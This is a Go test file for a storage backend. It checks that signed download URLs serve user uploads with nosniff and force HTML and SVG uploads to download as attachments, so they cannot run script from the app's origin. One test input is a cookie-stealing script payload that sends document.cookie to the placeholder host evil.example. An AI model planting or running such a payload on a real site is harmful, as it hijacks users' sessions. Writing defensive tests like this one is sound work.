package local

// CR5: a signed GET hands back bytes somebody else uploaded, and
// locally it hands them back from the APP'S OWN ORIGIN — so an object
// stored as text/html is a document with the app's cookies in reach.
//
// This is deliberately a local-only rule rather than a conformance
// case: in the cloud the same object is served by storage.googleapis.com,
// which is a different origin and serves what GCS stores. Asserting
// these headers in the shared suite would make gcp red for behaviour
// that is correct there.

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gsandoval/tako/pkg/backends"
)

func signedGetHeaders(t *testing.T, contentType, body string) http.Header {
	t.Helper()
	dir := t.TempDir()
	store := NewBucketStore(dir)
	signer, err := NewURLSigner(dir, "http://localhost:8080")
	if err != nil {
		t.Fatal(err)
	}
	if err := store.Put(context.Background(), "b", "k", backends.BlobData{
		Reader: strings.NewReader(body), ContentType: contentType, Size: int64(len(body)),
	}); err != nil {
		t.Fatal(err)
	}
	url, err := signer.SignGet(context.Background(), "b", "k", time.Minute)
	if err != nil {
		t.Fatal(err)
	}
	w := httptest.NewRecorder()
	SignedURLEndpoint(signer, store).ServeHTTP(w, httptest.NewRequest("GET", url, nil))
	if w.Code != http.StatusOK {
		t.Fatalf("signed GET answered %d: %s", w.Code, w.Body.String())
	}
	return w.Header()
}

func TestASignedGetPinsTheTypeItDeclares(t *testing.T) {
	h := signedGetHeaders(t, "image/png", "\x89PNG")
	if h.Get("X-Content-Type-Options") != "nosniff" {
		t.Error("uploaded bytes served without nosniff — the browser may look for a " +
			"better type than the one the upload declared")
	}
	if cd := h.Get("Content-Disposition"); cd != "" {
		t.Errorf("an image must still render inline, got Content-Disposition: %q", cd)
	}
}

func TestASignedGetWillNotRenderAnUploadAsADocument(t *testing.T) {
	for _, ct := range []string{"text/html", "text/html; charset=utf-8", "image/svg+xml", "application/xhtml+xml"} {
		h := signedGetHeaders(t, ct, "<script>parent.location='http://evil.example/'+document.cookie</script>")
		if h.Get("Content-Disposition") != "attachment" {
			t.Errorf("%s: an uploaded document is served inline from the app's own origin", ct)
		}
	}
}
